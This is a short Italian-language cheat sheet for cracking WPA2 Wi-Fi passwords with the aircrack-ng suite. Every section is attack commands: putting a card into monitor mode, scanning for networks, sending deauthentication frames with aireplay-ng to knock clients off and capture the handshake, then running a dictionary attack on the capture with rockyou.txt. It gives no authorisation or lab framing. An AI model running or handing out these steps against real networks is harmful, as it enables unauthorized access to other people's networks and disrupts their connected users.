# AIRCRACK-NG - ATTACCO WPA2

## Requisiti
* Scheda di rete con supporto Monitor Mode
* Kali Linux / Parrot OS / Distro Linux compatibili
* Aircrack-NG
* Tutti i pacchetti di Aircrack-NG
* Dizionario password (WordList), consigliato rockyou.txt

## Utilizzo generale

1. **Abilitare la modalità monitor sulla scheda di rete**

> $ airmon-ng list
> $ airmon-ng start [nome interfaccia]

2. **Scansionare le reti disponibili con Airodump-NG**

> $ airodump-ng [nome interfaccia]

3. **Utilizzare Airodump-NG e Aireplay-NG per catturare l'handshake**

Terminale 1 (Airodump):
> $ airodump-ng -c [channel] --bssid [bssid] -w [nome-file] [nome interfaccia]
  
Terminale 2 (Aireplay):
> $ aireplay-ng -0 [numero attacchi] -a [bssid] [nome interfaccia]

4. **Crackare il file .CAP contentente l'handshake tramite Aircrack-NG e la wordlist.txt scelta**
> $ aircrack-ng -a 2 -b [bssid> -w [worldlist.txt] [file .cap]
